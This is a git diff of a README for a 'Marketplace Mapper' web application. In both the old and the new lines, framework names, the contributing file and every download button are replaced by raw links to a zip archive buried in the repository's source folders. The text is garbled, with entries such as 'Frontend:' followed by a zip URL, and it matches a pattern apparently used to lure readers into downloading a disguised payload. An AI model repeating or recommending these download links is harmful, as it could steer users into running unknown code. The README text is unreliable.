@@ -2,7 +2,7 @@
 
 ## 📦 Overview
 
-Marketplace Mapper is a full-stack application designed to simplify the process of mapping seller CSV files to marketplace listing templates. This project features a user-friendly https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip frontend, allowing you to manage seller files, marketplace templates, and attribute mappings seamlessly. It also includes a robust Node/Express backend, utilizing PostgreSQL for efficient data handling.
+Marketplace Mapper is a full-stack application designed to simplify the process of mapping seller CSV files to marketplace listing templates. This project features a user-friendly https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip frontend, allowing you to manage seller files, marketplace templates, and attribute mappings seamlessly. It also includes a robust Node/Express backend, utilizing PostgreSQL for efficient data handling.
 
 ## 🚀 Features
 
@@ -15,15 +15,15 @@ Marketplace Mapper is a full-stack application designed to simplify the process 
 
 ## 🛠️ Technologies Used
 
-- **Frontend:** https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip, React Query, tailwindcss, Zon, zustand
-- **Backend:** https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip, https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip, PostgreSQL, Prisma
+- **Frontend:** https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip, React Query, tailwindcss, Zon, zustand
+- **Backend:** https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip, https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip, PostgreSQL, Prisma
 - **Additional Libraries:** axios, supabase, tanstack-react-query, TypeScript
 
 ## 🔗 Download Marketplace Mapper
 
 To get started with Marketplace Mapper, you need to download the latest release. You can easily do this by clicking the link below:
 
-[![Download Marketplace Mapper](https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip%20Now%21-Click%20Here-blue?style=flat&logo=github)](https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip)
+[![Download Marketplace Mapper](https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip%20Now%21-Click%20Here-blue?style=flat&logo=github)](https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ Follow these steps to download and run Marketplace Mapper. You will need a compu
 
 Go to the Marketplace Mapper releases page linked below. Here, you'll find the latest versions of the software available for download.
 
-[Visit this page to download](https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip)
+[Visit this page to download](https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip)
 
 ### Step 2: Select Your Version
 
@@ -72,7 +72,7 @@ If you encounter any issues, feel free to open an issue on the GitHub repository
 
 ### Can I contribute to Marketplace Mapper?
 
-Absolutely! We welcome contributions from anyone. To learn how to contribute, check out the https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip file in the repository.
+Absolutely! We welcome contributions from anyone. To learn how to contribute, check out the https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip file in the repository.
 
 ## 👥 Community Support
 
@@ -84,4 +84,4 @@ Marketplace Mapper is your go-to solution for mapping seller data to marketplace
 
 Make sure to download the latest version and start mapping today!
 
-[![Download Marketplace Mapper](https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip%20Now%21-Click%20Here-blue?style=flat&logo=github)](https://github.com/huzaifa-mn/marketplace-mapper/raw/refs/heads/main/frontend/public/mapper-marketplace-1.7.zip)
+[![Download Marketplace Mapper](https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip%20Now%21-Click%20Here-blue?style=flat&logo=github)](https://raw.githubusercontent.com/huzaifa-mn/marketplace-mapper/main/frontend/src/app/marketplaces/[id]/mapper-marketplace-v1.1-alpha.4.zip)
